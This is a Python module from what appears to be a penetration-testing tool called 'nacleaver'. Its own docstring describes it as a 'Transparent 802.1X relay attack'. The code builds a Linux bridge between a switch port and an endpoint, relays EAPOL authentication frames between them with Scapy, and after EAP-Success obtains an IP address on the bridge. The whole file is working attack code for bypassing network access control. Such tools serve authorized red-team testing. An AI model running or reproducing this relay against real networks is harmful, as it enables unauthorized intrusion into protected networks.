import logging
import queue
import re
import time
from dataclasses import dataclass
from multiprocessing import Event, Process, Queue

from core.utils import (
    Cleanup,
    get_iface_mac,
    get_iface_state,
    request_network_lease,
    run_subprocess,
)

logger = logging.getLogger('nacleaver')

# Linux packet(7) constants are not exposed by every Python build.  A relay
# listener must ignore locally transmitted frames; otherwise a frame emitted
# by sendp() on one side can be captured as a new frame and echoed forever.
_SOL_PACKET = 263
_PACKET_IGNORE_OUTGOING = 23


@dataclass
class RelayResult:
    success: bool
    auth_completed: bool
    obtained_ip: str | None
    endpoint_mac: str | None
    duration_sec: float
    eapol_frames_relayed: int
    error: str | None = None
    gateway: str | None = None
    dhcp_returncode: int | None = None
    network_interface: str | None = None
    method: str = "relay"
    address_family: str | None = None


def _parse_eap_type(pkt) -> str:
    """Extract EAP code + type string for logging. Never raises."""
    try:
        if pkt.haslayer("EAP"):
            code = pkt["EAP"].code
            typ = getattr(pkt["EAP"], "type", None)
            return f"code={code} type={typ}"
    except Exception as exc:
        logger.debug(f"[relay] EAP frame parse error: {exc}")
    return "unknown"


def _open_ingress_eapol_socket(iface: str):
    """Open a Scapy listener that cannot receive this host's outgoing frames."""
    from scapy.all import conf

    listener = conf.L2listen(iface=iface, filter="ether proto 0x888e")
    try:
        listener.ins.setsockopt(_SOL_PACKET, _PACKET_IGNORE_OUTGOING, 1)
    except (AttributeError, OSError) as exc:
        listener.close()
        raise RuntimeError(
            f"Kernel cannot suppress outgoing packet capture on {iface}: {exc}"
        ) from exc
    return listener


def _relay_switch_to_endpoint(
    iface_switch: str,
    iface_endpoint: str,
    event_queue: Queue,
    stop_event: Event,
    auth_observed: Event,
) -> None:
    """Child process: sniff EAPOL on switch-side interface and forward to endpoint side."""
    from scapy.all import sniff, sendp

    def handler(pkt):
        try:
            sendp(pkt, iface=iface_endpoint, verbose=False)
            eap_info = _parse_eap_type(pkt)
            if not auth_observed.is_set():
                event_queue.put({"direction": "sw→ep", "type": eap_info})
            # Check for EAP-Success (code=3)
            try:
                if not auth_observed.is_set() and pkt.haslayer("EAP") and pkt["EAP"].code == 3:
                    event_queue.put({"event": "EAP_SUCCESS"})
            except Exception as exc:
                logger.debug(f"[relay] EAP-Success parse error: {exc}")
        except Exception as exc:
            logger.debug(f"[relay] switch-to-endpoint forwarding error: {exc}")

    listener = None
    try:
        listener = _open_ingress_eapol_socket(iface_switch)
        event_queue.put({"event": "WORKER_READY", "worker": "switch"})
        # Loop with short timeouts so stop_event is checked regularly.
        while not stop_event.is_set():
            sniff(opened_socket=listener, store=False, timeout=2, prn=handler)
    except Exception as exc:
        event_queue.put({"event": "WORKER_ERROR", "worker": "switch", "error": str(exc)})
    finally:
        if listener is not None:
            listener.close()


def _relay_endpoint_to_switch(
    iface_endpoint: str,
    iface_switch: str,
    event_queue: Queue,
    stop_event: Event,
    auth_observed: Event,
) -> None:
    """Child process: sniff EAPOL on endpoint-side interface and forward to switch side."""
    from scapy.all import sniff, sendp

    def handler(pkt):
        try:
            sendp(pkt, iface=iface_switch, verbose=False)
            eap_info = _parse_eap_type(pkt)
            if not auth_observed.is_set():
                event_queue.put({"direction": "ep→sw", "type": eap_info})
        except Exception as exc:
            logger.debug(f"[relay] endpoint-to-switch forwarding error: {exc}")

    listener = None
    try:
        listener = _open_ingress_eapol_socket(iface_endpoint)
        event_queue.put({"event": "WORKER_READY", "worker": "endpoint"})
        while not stop_event.is_set():
            sniff(opened_socket=listener, store=False, timeout=2, prn=handler)
    except Exception as exc:
        event_queue.put({"event": "WORKER_ERROR", "worker": "endpoint", "error": str(exc)})
    finally:
        if listener is not None:
            listener.close()


def setup_bridge(
    iface_switch: str,
    iface_endpoint: str,
    bridge_name: str = "nacleaver_br",
) -> str:
    """Create a checked Linux bridge and block kernel EAPOL forwarding."""
    if not re.fullmatch(r"[A-Za-z0-9_.-]{1,15}", bridge_name):
        raise RuntimeError(f"Invalid bridge name: {bridge_name}")

    rc, _, err = run_subprocess(["ip", "link", "add", "name", bridge_name, "type", "bridge"])
    if rc != 0:
        raise RuntimeError(f"Failed to create bridge {bridge_name}: {err.strip()}")
    Cleanup.register_bridge(bridge_name)

    def checked(command: list[str], action: str) -> None:
        cmd_rc, _, cmd_err = run_subprocess(command)
        if cmd_rc != 0:
            raise RuntimeError(f"{action} failed: {cmd_err.strip() or f'exit {cmd_rc}'}")

    checked(
        ["ip", "link", "set", bridge_name, "type", "bridge", "stp_state", "0"],
        f"Disabling STP on {bridge_name}",
    )
    checked(["ip", "link", "set", iface_switch, "master", bridge_name],
            f"Adding {iface_switch} to {bridge_name}")
    checked(["ip", "link", "set", iface_endpoint, "master", bridge_name],
            f"Adding {iface_endpoint} to {bridge_name}")
    checked(["ip", "link", "set", bridge_name, "up"], f"Bringing {bridge_name} up")
    checked(["ip", "link", "set", iface_switch, "up"], f"Bringing {iface_switch} up")
    checked(["ip", "link", "set", iface_endpoint, "up"], f"Bringing {iface_endpoint} up")

    # Scope interception to this relay's two bridge ports.  An unqualified
    # BROUTING rule would alter EAPOL handling on every bridge on the host.
    for iface in (iface_switch, iface_endpoint):
        eapol_rule = ["-i", iface, "-p", "0x888e", "-j", "DROP"]
        rc_ebt, _, err_ebt = run_subprocess([
            "ebtables", "-t", "broute", "-A", "BROUTING", *eapol_rule,
        ])
        if rc_ebt != 0:
            raise RuntimeError(
                f"Unable to isolate EAPOL on {iface} from kernel bridging: "
                f"{err_ebt.strip() or f'exit {rc_ebt}'}"
            )
        Cleanup.register_ebtables_rule("broute", "BROUTING", eapol_rule)

    logger.info(f"[relay] Bridge {bridge_name} created with {iface_switch} and {iface_endpoint}")
    return bridge_name


def teardown_bridge(bridge_name: str, iface_switch: str, iface_endpoint: str) -> bool:
    """Remove relay state, checking every operation and reporting partial failure."""
    success = True

    for iface in (iface_switch, iface_endpoint):
        eapol_rule = ["-i", iface, "-p", "0x888e", "-j", "DROP"]
        rc, _, err = run_subprocess([
            "ebtables", "-t", "broute", "-D", "BROUTING", *eapol_rule,
        ])
        if rc != 0:
            success = False
            logger.warning(f"[relay] ebtables rule cleanup failed on {iface}: {err.strip()}")
        else:
            Cleanup.unregister_ebtables_rule("broute", "BROUTING", eapol_rule)

    for iface in (iface_switch, iface_endpoint):
        rc, _, err = run_subprocess(["ip", "link", "set", iface, "nomaster"])
        if rc != 0 and "not enslaved" not in err.lower():
            success = False
            logger.warning(f"[relay] Unable to detach {iface}: {err.strip()}")

    rc, _, err = run_subprocess(["ip", "link", "delete", bridge_name])
    if rc != 0 and "cannot find device" not in err.lower():
        success = False
        logger.warning(f"[relay] Unable to delete bridge {bridge_name}: {err.strip()}")
    else:
        Cleanup.unregister_bridge(bridge_name)
    return success

def run_relay(
    iface_switch: str,
    iface_endpoint: str,
    auth_timeout: int = 90,
    dhcp_timeout: int = 15,
    bridge_name: str = "nacleaver_br",
    verbose: bool = False,
) -> RelayResult:
    """
    Transparent 802.1X relay attack.
    Bridges all non-EAPOL traffic via Linux bridge kernel.
    Relays EAPOL frames bidirectionally via multiprocessing sniff loops.
    When EAP-Success is seen, obtains IPv4 or IPv6 on the bridge interface.
    """
    # Validate both interfaces
    for iface in (iface_switch, iface_endpoint):
        state = get_iface_state(iface)
        if state not in ('up', 'unknown'):
            return RelayResult(
                success=False,
                auth_completed=False,
                obtained_ip=None,
                endpoint_mac=None,
                duration_sec=0.0,
                eapol_frames_relayed=0,
                error=f"Interface {iface} is not up (state={state})",
            )

    for iface in (iface_switch, iface_endpoint):
        prepared, prepare_error = Cleanup.prepare_interface(iface)
        if not prepared:
            Cleanup.run_all()
            return RelayResult(
                success=False,
                auth_completed=False,
                obtained_ip=None,
                endpoint_mac=None,
                duration_sec=0.0,
                eapol_frames_relayed=0,
                error=prepare_error,
            )

    try:
        endpoint_mac = get_iface_mac(iface_endpoint)
    except FileNotFoundError as e:
        Cleanup.run_all()
        return RelayResult(
            success=False,
            auth_completed=False,
            obtained_ip=None,
            endpoint_mac=None,
            duration_sec=0.0,
            eapol_frames_relayed=0,
            error=str(e),
        )

    try:
        bridge_name = setup_bridge(iface_switch, iface_endpoint, bridge_name=bridge_name)
    except RuntimeError as e:
        Cleanup.run_all()
        return RelayResult(
            success=False,
            auth_completed=False,
            obtained_ip=None,
            endpoint_mac=endpoint_mac,
            duration_sec=0.0,
            eapol_frames_relayed=0,
            error=str(e),
        )

    event_queue: Queue = Queue()
    stop_event: Event = Event()
    auth_observed: Event = Event()

    p1 = Process(
        target=_relay_switch_to_endpoint,
        args=(iface_switch, iface_endpoint, event_queue, stop_event, auth_observed),
        daemon=True,
    )
    p2 = Process(
        target=_relay_endpoint_to_switch,
        args=(iface_endpoint, iface_switch, event_queue, stop_event, auth_observed),
        daemon=True,
    )
    started: list[Process] = []
    try:
        for process in (p1, p2):
            process.start()
            started.append(process)
            Cleanup.register_worker_process(process, stop_event)
    except Exception as exc:
        stop_event.set()
        for process in started:
            process.join(timeout=1)
            if process.is_alive():
                process.terminate()
                process.join(timeout=1)
        Cleanup.run_all()
        return RelayResult(
            success=False,
            auth_completed=False,
            obtained_ip=None,
            endpoint_mac=endpoint_mac,
            duration_sec=0.0,
            eapol_frames_relayed=0,
            error=f"Relay worker startup failed: {exc}",
        )

    start = time.monotonic()
    frames_relayed = 0
    auth_completed = False

    def stop_workers() -> None:
        Cleanup.stop_worker_processes()

    # A worker that cannot exclude locally emitted frames would turn the relay
    # into an EAPOL echo loop.  Require both workers to confirm safe startup.
    ready_workers: set[str] = set()
    worker_error = None
    startup_deadline = time.monotonic() + min(10.0, max(2.0, auth_timeout / 3))
    while len(ready_workers) < 2 and time.monotonic() < startup_deadline:
        try:
            msg = event_queue.get(timeout=0.5)
        except queue.Empty:
            if not p1.is_alive() or not p2.is_alive():
                worker_error = "A relay worker exited during startup"
                break
            continue
        if msg.get("event") == "WORKER_READY":
            ready_workers.add(str(msg.get("worker")))
        elif msg.get("event") == "WORKER_ERROR":
            worker_error = f"{msg.get('worker')} worker: {msg.get('error')}"
            break

    if worker_error or len(ready_workers) < 2:
        stop_workers()
        teardown_bridge(bridge_name, iface_switch, iface_endpoint)
        Cleanup.restore_interface(iface_switch)
        Cleanup.restore_interface(iface_endpoint)
        return RelayResult(
            success=False,
            auth_completed=False,
            obtained_ip=None,
            endpoint_mac=endpoint_mac,
            duration_sec=time.monotonic() - start,
            eapol_frames_relayed=frames_relayed,
            error=worker_error or "Relay workers did not become ready",
        )

    logger.info(f"[relay] Relay started: {iface_switch} ↔ {iface_endpoint} (timeout={auth_timeout}s)")

    while time.monotonic() - start < auth_timeout:
        try:
            msg = event_queue.get(timeout=1.0)
            if msg.get("event") == "WORKER_ERROR":
                worker_error = f"{msg.get('worker')} worker: {msg.get('error')}"
                break
            if msg.get("event") == "EAP_SUCCESS":
                logger.info("[relay] EAP-Success received — authentication completed!")
                auth_completed = True
                auth_observed.set()
                break
            if "direction" in msg:
                frames_relayed += 1
                if verbose:
                    logger.debug(f"[relay] EAPOL {msg['direction']} {msg.get('type', '')}")
        except queue.Empty:
            continue

    duration = time.monotonic() - start

    if not auth_completed:
        stop_workers()
        failure = worker_error or "Authentication timed out"
        logger.warning(
            f"[relay] {failure} after {duration:.1f}s "
            f"({frames_relayed} EAPOL frames relayed)"
        )
        teardown_bridge(bridge_name, iface_switch, iface_endpoint)
        Cleanup.restore_interface(iface_switch)
        Cleanup.restore_interface(iface_endpoint)
        return RelayResult(
            success=False,
            auth_completed=False,
            obtained_ip=None,
            endpoint_mac=endpoint_mac,
            duration_sec=duration,
            eapol_frames_relayed=frames_relayed,
            error=failure,
        )

    # Obtain IPv4 or IPv6 via the bridge interface.
    logger.info(f"[relay] Requesting IPv4/IPv6 addressing on bridge {bridge_name} ...")
    lease = request_network_lease(bridge_name, timeout=dhcp_timeout)
    if lease.success and (not p1.is_alive() or not p2.is_alive()):
        logger.error("[relay] EAPOL forwarding stopped before access verification")
        stop_workers()
        teardown_bridge(bridge_name, iface_switch, iface_endpoint)
        Cleanup.restore_interface(iface_switch)
        Cleanup.restore_interface(iface_endpoint)
        return RelayResult(
            success=False,
            auth_completed=True,
            obtained_ip=None,
            endpoint_mac=endpoint_mac,
            duration_sec=time.monotonic() - start,
            eapol_frames_relayed=frames_relayed,
            error="EAPOL forwarding stopped after authentication",
        )
    if lease.success:
        logger.info(f"[relay] {lease.address_family} address obtained on bridge: {lease.ip}")
    else:
        logger.warning(f"[relay] Address acquisition failed on bridge {bridge_name}: {lease.error}")
        stop_workers()
        teardown_bridge(bridge_name, iface_switch, iface_endpoint)
        Cleanup.restore_interface(iface_switch)
        Cleanup.restore_interface(iface_endpoint)

    return RelayResult(
        success=lease.success,
        auth_completed=True,
        obtained_ip=lease.ip,
        endpoint_mac=endpoint_mac,
        duration_sec=duration,
        eapol_frames_relayed=frames_relayed,
        error=None if lease.success else f"Auth completed but address acquisition failed: {lease.error}",
        gateway=lease.gateway,
        dhcp_returncode=lease.returncode,
        network_interface=bridge_name if lease.success else None,
        address_family=lease.address_family if lease.success else None,
    )


if __name__ == "__main__":
    import sys
    from rich import print as rprint
    from core.utils import require_root, setup_logging
    require_root()
    setup_logging(verbose=True)
    if len(sys.argv) < 3:
        print("Usage: sudo python3 core/relay.py <iface_switch> <iface_endpoint>")
        sys.exit(1)
    iface_sw = sys.argv[1]
    iface_ep = sys.argv[2]
    result = run_relay(iface_sw, iface_ep, verbose=True)
    rprint(result)
